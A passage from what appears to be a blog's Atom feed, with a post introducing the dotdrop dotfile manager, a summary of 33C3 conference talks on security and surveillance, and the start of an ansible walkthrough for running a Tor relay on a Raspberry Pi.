&lt;li&gt;I want different versions of same dotfile to be generated
    depending on where I want it deployed.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most of the tools out there are designed for people using either a single
host or the same set of dotfiles on all their hosts.
One exception is &lt;a href="https://github.com/tomjnixon/Dotfiles"&gt;ConMan&lt;/a&gt; which is a nice
tools that uses &lt;a href="http://www.gnu.org/software/m4/m4.html"&gt;M4 macro processor&lt;/a&gt; to
generate the dotfiles. I found the idea really interesting but was missing the
possibility to compare the local dotfiles with the ones stored.
Moreover I wanted to code something ;-)&lt;/p&gt;
&lt;p&gt;I thus decided to implement my own tool to manage my dotfiles. I went for
Python3 and needed a templating engine to parse and generate different versions
of the same files based on macros. This led me to &lt;a href="http://jinja.pocoo.org/"&gt;jinja2&lt;/a&gt;,
a well recognized templating engine for python.&lt;/p&gt;
&lt;p&gt;The resulting tool is &lt;strong&gt;&lt;a href="https://github.com/deadc0de6/dotdrop"&gt;dotdrop&lt;/a&gt;&lt;/strong&gt; !
Dotdrop's goal is to help you manage your dotfiles by storing them once and deploying
them on different hosts the way you want them to be.&lt;/p&gt;
&lt;p&gt;Dotdrop keeps all its configs in a config file (&lt;code&gt;config.yaml&lt;/code&gt;) where all
the different dotfiles are listed as well as the profiles where they should
be deployed. It thus gives the ability to have different sets
of dotfiles on different hosts. For example you would install all your dotfiles
on your home laptop but would have only a subset for your vserver (a stripped down
version of vimrc for example along with some other basic dotfiles: tmux, etc).
Also it leverages the power of &lt;a href="http://jinja.pocoo.org/"&gt;jinja2&lt;/a&gt; by allowing to
template your dotfiles such that the same stored dotfile could be generated differently
depending on where it is to be installed.&lt;/p&gt;
&lt;p&gt;It has nice features like the ability to import your dotfiles automatically and
to compare the dotfiles you have currently on your host with the ones stored
on dotdrop; such that if you change your dotfiles from your desktop, you are
able to see what has changed and how you need to update it on dotdrop
to reflect what you want.&lt;/p&gt;
&lt;p&gt;Let's take an example: you want to manage the following two files using dotdrop:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;$HOME/.xinitrc&lt;/em&gt;: it is to be deployed on both your home and your office host but
  with two different versions of the file.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;$HOME/.vimrc&lt;/em&gt;: it only needs to be deployed on your home host.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A template for jinja2 needs to be set up for &lt;em&gt;.xinitrc&lt;/em&gt; such that different versions of
that file are installed using dotdrop (no worry it's straight forward and doesn't
need much to be efficient):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="c1"&gt;# load Xresources&lt;/span&gt;
&lt;span class="nv"&gt;userresources&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;/.Xresources
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -f &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$userresources&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
      xrdb -merge &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$userresources&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="c1"&gt;# launch the wm&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;%@@ &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;profile&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;home&amp;quot;&lt;/span&gt; @@%&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;exec&lt;/span&gt; awesome
&lt;span class="o"&gt;{&lt;/span&gt;%@@ &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="nv"&gt;profile&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;office&amp;quot;&lt;/span&gt; @@%&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;exec&lt;/span&gt; bspwm
&lt;span class="o"&gt;{&lt;/span&gt;%@@ endif @@%&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When the above dotfile is deployed it will result in two different file depending
if you are running it from the &lt;em&gt;home&lt;/em&gt; profile or the &lt;em&gt;office&lt;/em&gt; one
(see the &lt;strong&gt;if branch&lt;/strong&gt; above). Jinja2 templating
engine will choose the right branch and drop the rest such that the resulting file
is a clean dotfile.&lt;/p&gt;
&lt;p&gt;Moreover using the config file you are able to specify what needs to be installed
with which profile:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;config&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;backup&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;create&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dotpath&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dotfiles&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;dotfiles&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;f_xinitrc&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dst&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;~/.xinitrc&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;src&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;xinitrc&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;f_vimrc&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dst&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;~/.vimrc&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;src&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;vimrc&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;profiles&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;home&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;f_xinitrc&lt;/span&gt;
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;f_vimrc&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;office&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;f_xinitrc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hope this tool will be useful to some. If you have issues using it or want to contribute,
feel free to do a PR or create an issue on &lt;a href="https://github.com/deadc0de6/dotdrop"&gt;dotdrop's page on github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Link to the project on github: &lt;strong&gt;&lt;a href="https://github.com/deadc0de6/dotdrop"&gt;dotdrop&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Happy ricing !&lt;/p&gt;</content><category term="dotfiles"></category><category term="linux"></category></entry><entry><title>33c3 works for me</title><link href="https://deadc0de.re/articles/33c3.html" rel="alternate"></link><published>2017-01-08T00:00:00+01:00</published><updated>2017-01-08T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-01-08:/articles/33c3.html</id><summary type="html">&lt;p&gt;33c3 works for me&lt;/p&gt;</summary><content type="html">&lt;p&gt;Here's a summary of some of the talks I've seen at the &lt;a href="https://events.ccc.de/congress/2016/wiki/Main_Page"&gt;33C3&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I haven't had time to see all the talks (obviously), therefore for
a complete list of the talks see the &lt;em&gt;Additional links&lt;/em&gt;'s section below.
By the way this list is in no particular order but the starred (*) talks are the ones I
appreciated the most.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8044.html"&gt;What could possibly go wrong with &amp;lt;insert x86 instruction here&lt;/a&gt;&lt;/em&gt;*
by Clémentine Maurice and Moritz Lipp was very interesting. They presented their work on cache-attacks starting
with a general explanation on cache attacks followed with specific examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Covert channel attacks and SSH connection over the cache&lt;/li&gt;
&lt;li&gt;Crypto side-channel attacks (AES T-tables attack and kernel ASLR bypass)&lt;/li&gt;
&lt;li&gt;Keylogger by monitoring cache line access&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The video is available &lt;a href="https://media.ccc.de/v/33c3-8044-what_could_possibly_go_wrong_with_insert_x86_instruction_here"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8127.html"&gt;How do I crack satellite and cable pay tv&lt;/a&gt;&lt;/em&gt;
by Chris Gerlinsky
gives an overview of his extended work on hacking into set-up boxes and reverse engineering the
different protocols and cryptographic techniques used in pay-tv software/hardware.
A must see for those into the field. For the recording, go &lt;a href="https://media.ccc.de/v/33c3-8127-how_do_i_crack_satellite_and_cable_pay_tv"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Joseph Cox gave in his talk
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8018.html"&gt;Law enforcement are hacking the planet&lt;/a&gt;&lt;/em&gt;
an overview of the different attacks performed by the NSA worldwide and how they were trespassing
their rights (operation &lt;em&gt;Pacifier&lt;/em&gt;, operation &lt;em&gt;Torpedo&lt;/em&gt;, ...).
The video is available &lt;a href="https://media.ccc.de/v/33c3-8018-law_enforcement_are_hacking_the_planet"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you're using (or planning to use) N26 app by FinTech, you might want to have a look at the
talk by Vincent Haupert
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/7969.html"&gt;Shut up and take my money&lt;/a&gt;&lt;/em&gt;*.
He identified several flaws and security vulnerabilities which made N26 very vulnerable. For the record it seems they
have since fixed the disclosed issues. The video is available
&lt;a href="https://media.ccc.de/v/33c3-7969-shut_up_and_take_my_money"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8061.html"&gt;You can -j REJECT but you can not hide: Global scanning of the IPv6 Internet&lt;/a&gt;&lt;/em&gt; is a talk by Tobias Fiebig
on using DNS queries to discover
IPv6 hosts. This talk, despite its name, does mostly focus on discovering
IPv6 hosts than actually scanning them.
You can find the video under
&lt;a href="https://media.ccc.de/v/33c3-8061-you_can_-j_reject_but_you_can_not_hide_global_scanning_of_the_ipv6_internet"&gt;this link&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Rich Jones in his talk
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/7865.html"&gt;Gone in 60 Milliseconds&lt;/a&gt;&lt;/em&gt;
walks us to the hacking of AWS event-driven micro-services (AWS lambda, s3 buckets, ...) through exploitation
and ex-filtration techniques. The recording is available
&lt;a href="https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you ever wondered how bank transactions work and why international payments take usually a lot
of time, have a look at the talk by Mark van Cuijk
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8315.html"&gt;A world without blockchain&lt;/a&gt;&lt;/em&gt;.
The recording is available &lt;a href="https://media.ccc.de/v/33c3-8315-a_world_without_blockchain"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8095.html"&gt;Radare demystified&lt;/a&gt;&lt;/em&gt;* talk
by pancake is a must see for anyone interested by r2 or using it. This talk gives a great
overview of the different features available. A must see ! Video available under
&lt;a href="https://media.ccc.de/v/33c3-8095-radare_demystified"&gt;this link&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Anna and Andre Meister in their talk
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8117.html"&gt;3 Years After Snowden: Is Germany fighting State Surveillance?&lt;/a&gt;&lt;/em&gt;
show us what has happened since the Snowden's revelations in Germany.
How the BND collaborates with the NSA to spy on its own citizen but also helping the US
to perform their mass surveillance.
Video is available
&lt;a href="https://media.ccc.de/v/33c3-8117-3_years_after_snowden_is_germany_fighting_state_surveillance"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The talk &lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8034.html"&gt;Build your own NSA&lt;/a&gt;&lt;/em&gt;*
by Andreas Dewes and sveckert gives a very interesting work on de-anonymization
or how are we actually identifiable through our browsing history. As a hint, do not trust WoT
(Web of Trust). A must see.
The video is available under &lt;a href="https://media.ccc.de/v/33c3-8034-build_your_own_nsa"&gt;this link&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ever wondered what it would take to build an elevator to the moon ? The talk
&lt;em&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/events/8407.html"&gt;An Elevator to the Moon (and back)&lt;/a&gt;&lt;/em&gt;
by Markus Landgraf will give you an overview of the different challenges to face.
Find the video &lt;a href="https://media.ccc.de/v/33c3-8407-an_elevator_to_the_moon_and_back"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Have fun watching those talks !&lt;/p&gt;
&lt;h1&gt;Additional links&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The videos: &lt;a href="http://streaming.media.ccc.de/33c3"&gt;http://streaming.media.ccc.de/33c3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The wiki: &lt;a href="https://events.ccc.de/congress/2016/wiki/Main_Page"&gt;https://events.ccc.de/congress/2016/wiki/Main_Page&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The weblog: &lt;a href="https://events.ccc.de/"&gt;https://events.ccc.de/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The youtube playlist: &lt;a href="https://www.youtube.com/user/mediacccde"&gt;https://www.youtube.com/user/mediacccde&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The Fahrplan: &lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/"&gt;https://fahrplan.events.ccc.de/congress/2016/Fahrplan/&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/schedule/0.html"&gt;Day 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/schedule/1.html"&gt;Day 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/schedule/2.html"&gt;Day 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://fahrplan.events.ccc.de/congress/2016/Fahrplan/schedule/3.html"&gt;Day 4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</content><category term="CCC"></category><category term="conf"></category><category term="33c3"></category><category term="security"></category><category term="hacking"></category></entry><entry><title>Tor relay on a rpi2</title><link href="https://deadc0de.re/articles/rpi2-tor-relay.html" rel="alternate"></link><published>2016-11-16T00:00:00+01:00</published><updated>2016-11-16T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-11-16:/articles/rpi2-tor-relay.html</id><summary type="html">&lt;p&gt;setup a tor relay on a Raspberry Pi using ansible&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is a little walkthrough on using ansible to setup a tor relay (not an exit node)
on a &lt;a href="https://www.raspberrypi.org/"&gt;Raspberry Pi&lt;/a&gt;. It might be overhead to
use ansible for this purpose but the initial goal was to experiment with ansible.&lt;/p&gt;
&lt;p&gt;First go to &lt;a href="https://www.raspberrypi.org/downloads/raspbian/"&gt;Raspberry Pi download&lt;/a&gt;
and download the raspbian iso. Then flash it to your SD card and start your Raspberry Pi.
A comprehensive guide is available &lt;a href="https://www.raspberrypi.org/documentation/installation/installing-images/linux.md"&gt;here&lt;/a&gt;.
You might also want to follow the config setup doc &lt;a href="https://www.raspberrypi.org/documentation/configuration/raspi-config.md"&gt;here&lt;/a&gt;
which explains the different options of the &lt;code&gt;raspi-config&lt;/code&gt; tool.&lt;/p&gt;
&lt;p&gt;Once you have your Raspberry Pi up and running, let's setup &lt;a href="https://docs.ansible.com/"&gt;ansible&lt;/a&gt;
to install and set up a tor relay.&lt;/p&gt;
&lt;p&gt;To get the &lt;a href="https://docs.ansible.com/ansible/intro_installation.html#running-from-source"&gt;latest version of ansible&lt;/a&gt;,
run the following on Debian/Ubuntu. For other distribution,
follow the &lt;a href="https://docs.ansible.com/ansible/intro_installation.html#running-from-source"&gt;ansible &lt;em&gt;installation from source&lt;/em&gt; doc&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt-get install python-pip python-dev git -y
$ sudo pip install PyYAML jinja2 paramiko
$ git clone https://github.com/ansible/ansible.git --recursive /tmp/ansible
$ &lt;span class="nb"&gt;cd&lt;/span&gt; /tmp/ansible
$ sudo make install
$ sudo mkdir -p /etc/ansible
$ sudo cp /tmp/ansible/examples/hosts /etc/ansible/.
$ &lt;span class="nb"&gt;cd&lt;/span&gt; -
$ sudo rm -rf /tmp/ansible
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then make sure you're running the latest version with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ansible --version
ansible &lt;span class="m"&gt;2&lt;/span&gt;.2.0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will be using &lt;a href="https://docs.ansible.com/ansible/playbooks.html"&gt;ansible-playbook&lt;/a&gt; in order
to run the different tasks on the Raspberry Pi.&lt;/p&gt;
&lt;p&gt;Create a playbook in a file named &lt;code&gt;rpitor.yml&lt;/code&gt; and copy the following
lines to it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;hosts&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;rpitor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;vars&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;torport=TODO&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dirport=TODO&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;nodename=TODO&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will then need to complete this file with specific tasks that are to be executed from your host
computer to your Raspberry Pi to setup the tor relay.&lt;/p&gt;
&lt;p&gt;These are the options you need to fill in in the above file (the &lt;em&gt;TODO&lt;/em&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;torport&lt;/strong&gt;: this is the port on which tor will be listening
    (it must be forwarded from your firewall/router)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.torproject.org/docs/faq#RelayWritesMoreThanItReads"&gt;&lt;strong&gt;dirport&lt;/strong&gt;&lt;/a&gt;:
    this is the port to listen for directory requests (must as well be forwarded from
    your firewall/router)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nodename&lt;/strong&gt;: this is the name of your node (be creative)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Update the system and install the packages&lt;/h2&gt;
&lt;p&gt;The following tasks will install the needed packages to
run tor; add those lines to the playbook.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;rpi update&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;shell&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;rpi-update&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;become&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;update and upgrade&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;apt&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;update_cache=yes&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;upgrade=dist&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;install packages&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;apt&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name={{ item }}&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=installed&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;with_items&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;tor&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;tor-arm&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;stop tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;service&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=tor&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=stopped&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Tweak the system&lt;/h2&gt;
&lt;p&gt;Some configs need to be set in order to run a tor relay. Feel
free to adapt those to your likings.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;update limits&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pam_limits&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;domain=*&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;limit_type=-&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;limit_item=nofile&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=120000&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set nic buffer size&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;shell&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/sbin/ifconfig eth0 txqueuelen 20000&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;become&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set configs permanent&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;lineinfile&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dest=/etc/rc.local&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;regexp=&amp;quot;^/sbin/ifconfig eth0 txqueuelen 20000$&amp;quot;&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;line=&amp;quot;/sbin/ifconfig eth0 txqueuelen 20000&amp;quot;&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;insertbefore=&amp;quot;^exit 0$&amp;quot;&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;become&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 1/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=vm.min_free_kbytes&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=16384&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 2/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=net.netfilter.nf_conntrack_max&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=1000000&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;

